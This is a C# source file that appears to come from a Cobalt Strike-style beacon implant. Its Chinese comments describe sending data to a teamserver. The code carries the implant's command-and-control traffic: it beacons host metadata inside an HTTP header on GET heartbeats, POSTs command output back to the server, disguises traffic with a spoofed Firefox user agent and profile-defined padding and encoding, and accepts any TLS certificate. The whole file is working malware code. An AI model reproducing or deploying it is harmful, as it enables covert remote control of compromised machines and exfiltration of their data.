using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Threading;
using System.Text;
using Beacon.Utils;
using Beacon.Profiles;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using NeoSmart.Utils;
using Microsoft.IdentityModel.Tokens;

namespace Beacon.Packet
{
    /// <summary>
    /// 负责执行后所产生数据以http协议进行发送
    /// </summary>
    class Commons
    {
        public Prase _prase;

        public Commons() {
            _prase = new Prase();
        }
        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        public static string  httpGetClientMetaPrependstr = string.Empty;
        public static string  httpGetClientMetaAppendstr = string.Empty;
        public static string httpGetServerOutputPrependstr = string.Empty;
        public static string httpGetServerOutputAppendstr = string.Empty;
        public static int httpGetServerOutputPrependstrLen= -1;
        public static int httpGetServerOutputAppendstrLen = -1;

        public static int httpPostClientOutputPrependstrLen = -1;
        public static int httpPostClientOutputAppendstrLen = -1;

        public static string  httpPostClientOutputPrependstr = string.Empty;
        public static byte[] cpbytes = new byte[] { };
        public static string  httpPostClientOutputAppendstr = string.Empty;
        public static byte[] cabytes = new byte[] { };
        public static string  httpPostServerOutputPrependstr = string.Empty;
        public static byte[] spbytes = new byte[] { };
        public static string  httpPostServerOutputAppendstr = string.Empty;
        public static byte[] sabytes = new byte[] { };
        public static void ProfileInit() 
        {

            foreach (var str in Config.httpGetClientMetaPrepend)
            {
                httpGetClientMetaPrependstr += str;
            }

            foreach (var str in Config.httpGetClientMetaAppend)
            {
                httpGetClientMetaAppendstr += str;
            }
            foreach (var str in Config.httpGetServerOutputPrepend) 
            {

                httpGetServerOutputPrependstr += str;
            }
            foreach (var str in Config.httpGetServerOutputAppend) 
            {
                httpGetServerOutputAppendstr += str;
            }

            ///  post //////

            foreach (var str in Config.httpPostClientOutputPrepend)
            {
                httpPostClientOutputPrependstr += str;
            }
            if (httpPostClientOutputPrependstrLen != -1)
            {
                cpbytes = new byte[httpPostClientOutputPrependstrLen];
            }
            else 
            {
                cpbytes = Encoding.UTF8.GetBytes(httpPostClientOutputPrependstr);

            }

            foreach (var str in Config.httpPostClientOutputAppend)
            {
                httpPostClientOutputAppendstr += str;
            }
            if (httpPostClientOutputAppendstrLen != -1)
            {
                cabytes = new byte[httpPostClientOutputAppendstrLen];
            }
            else 
            {
                cabytes = Encoding.UTF8.GetBytes(httpPostClientOutputAppendstr);
            }
            


            foreach (var str in Config.httpPostServerOutputPrepend)
            {
                httpPostServerOutputPrependstr += str;
            }
            spbytes = Encoding.UTF8.GetBytes(httpPostServerOutputPrependstr);
            foreach (var str in Config.httpPostServerOutputAppend)
            {
                httpPostServerOutputAppendstr += str;
            }
            sabytes = Encoding.UTF8.GetBytes(httpPostServerOutputAppendstr);
        }


        public static byte[] WebStreamDecrypt(byte[] array, string[] dectypes) 
        {
            if (array.Length == 0) 
            {
                return array;
            }
            byte[] resmeta = new byte[] { };
            string arraystr = Encoding.UTF8.GetString(array);
            foreach (string func in dectypes) 
            {
                switch (func) 
                {
                    case "base64url":
                        resmeta = Base64UrlEncoder.DecodeBytes(arraystr);
                        break;
                    case "base64":
                        resmeta = Convert.FromBase64String(arraystr);
                        break;
                    default:
                        return array;
                        break;
                }
            }
            return resmeta;
        }

        public static byte[] WebStreamEncrypt(byte[] array,string[] enctypes,string type)
        {

           // byte[] temparray = array;
            string resmeta = string.Empty;
            foreach (string func in enctypes)
            {
                switch (func)
                {
                    case "base64url":
                        // resmeta = Convert.ToBase64String(array, Base64FormattingOptions.None).TrimEnd('=').Replace('+', '-').Replace('/', '_');
                        resmeta = Base64UrlEncoder.Encode(array);
                        
                        // resmeta = UrlBase64.Encode(array);
                        //resmeta = Convert.ToBase64String(array);
                        break;
                    case "base64":
                        resmeta = Convert.ToBase64String(array);
                        break;
                    case "none":
                        {
                            if (type.ToLower() == "get")
                            {
                                resmeta = Convert.ToBase64String(array);
                                break;
                            }
                            else
                            {
                                return array;
                            }
                        }
                        return array;
                    default:
                        return array;

                }

            }

            return Encoding.UTF8.GetBytes(resmeta);
        }


        /// <summary>
        /// 通过GET发送数据给teamserver
        /// </summary>
        /// <param name="sURL">Get提交的URL地址</param>
        /// <returns>响应包内容</returns>
        public Byte[] HttpGet(string sURL)
        {
            Console.WriteLine("[*] SendMetaData HTTP Get to {0}", sURL);
            Console.WriteLine($"[+] 心跳包序号：{Config.alivepacketcount.ToString()}");
            Console.WriteLine($"[*] Cookie: {Convert.ToBase64String(_prase._strMetaData)}\n");
            Config.alivepacketcount += 1;
            return Retry.Do(() =>
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(sURL);
                System.Net.ServicePointManager.ServerCertificateValidationCallback = ValidateServerCertificate;
                request.Timeout = 1500000;
                request.Method = "GET";  
                //request.ContentType = "application/x-www-form-urlencoded";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0";
                request.Accept = "*/*";
                string metainfo = Encoding.UTF8.GetString(WebStreamEncrypt(_prase._strMetaData, Config.HttpGetClientMetaEncrytFunc,"get"));
                
                request.Headers.Add(Config.HttpMetaField, httpGetClientMetaPrependstr+metainfo+httpGetClientMetaAppendstr);

#if DEBUG
                
              //  Console.WriteLine($"Cookie: {RequestEncrypt(_prase._strMetaData)}");
#endif

                
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                //获取cookie  response.Cookies = cookie.GetCookies(response.ResponseUri);
                Byte[] tmp;
                using (Stream stream = response.GetResponseStream())
                {
                    using (MemoryStream ms = new MemoryStream())
                    {
                        Byte[] buffer = new Byte[1024];
                        int current = 0;
                        while ((current = stream.Read(buffer, 0, buffer.Length)) != 0)
                        {
                            ms.Write(buffer, 0, current);
                        }
                        tmp = ms.ToArray();
#if DEBUG
                        //Console.WriteLine(tmp.Length);
                        //Console.WriteLine(tmp);
#endif
                        return ms.ToArray();

                    }
                }
            }, TimeSpan.FromSeconds(Config._retryInterval), Config._maxAttempts);
        }


        /// <summary>
        /// 通过POST发送数据给teamserver
        /// </summary>
        /// <param name="sURL">Post提交的URL地址</param>
        /// <param name="payload">Post提交的数据</param>
        /// <returns>响应包内容</returns>
        public byte[] HttpPost(string sURL, int beaconid,byte[] payload = default(byte[]))
        {
#if DEBUG
            //  Console.WriteLine("[*] Attempting HTTP POST to {0}", sURL);
#endif
            Console.WriteLine("POST DATA START =====================================");
            return Retry.Do(() =>
            { 
                Console.WriteLine($"[+] BeaconID: {beaconid}");
              //  string temp = Base64UrlEncoder.Encode(beaconid.ToString());
                byte[] encbyte = WebStreamEncrypt(Encoding.UTF8.GetBytes(beaconid.ToString()), Config.HttpPostClientIDEncrytFunc,"post");
                string encpara = Encoding.UTF8.GetString(encbyte);
                Console.WriteLine("[*] Attempting HTTP POST to {0}", sURL + encpara);
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(sURL+encpara);
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0";
                request.Accept = "*/*";
                request.Method = "POST";
                
                if (payload.Length > 0)
                {
                    request.ContentType = "application/octet-stream";
                    byte[] EncArray = WebStreamEncrypt(payload,Config.HttpPostClientOutputEncrytFunc,"post");
                    request.ContentLength = EncArray.Length+cpbytes.Length+cabytes.Length;
                    var requestStream = request.GetRequestStream();
                    requestStream.Write(cpbytes, 0, cpbytes.Length);
                    requestStream.Write(EncArray, 0, EncArray.Length);
                    requestStream.Write(cabytes, 0, cabytes.Length);
                    requestStream.Close();
                }
                var response = request.GetResponse();
            Console.WriteLine("POST DATA END =====================================\n");
            using (MemoryStream memstream = new MemoryStream())
                {
                    response.GetResponseStream().CopyTo(memstream);
                    return memstream.ToArray();
                }
        }, TimeSpan.FromSeconds(Config._retryInterval), Config._maxAttempts);
        }
    }

    public static class Retry
    {

        public static T Do<T>(Func<T> action, TimeSpan retryInterval,
            int maxAttempts = 3)
        {
            var exceptions = new List<Exception>();

            for (var attempts = 0; attempts < maxAttempts; attempts++)
            {
                try
                {
                    if (attempts > 0)
                    {
                        Thread.Sleep(retryInterval);
                    }
#if DEBUG
                  // Console.WriteLine($"[-] 重试次数 #{attempts + 1}");
#endif
                    return action();
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine("\t[!] {0}", ex.Message);
#endif
                    exceptions.Add(ex);
                }
            }

            throw new AggregateException(exceptions);
        }
    }
}

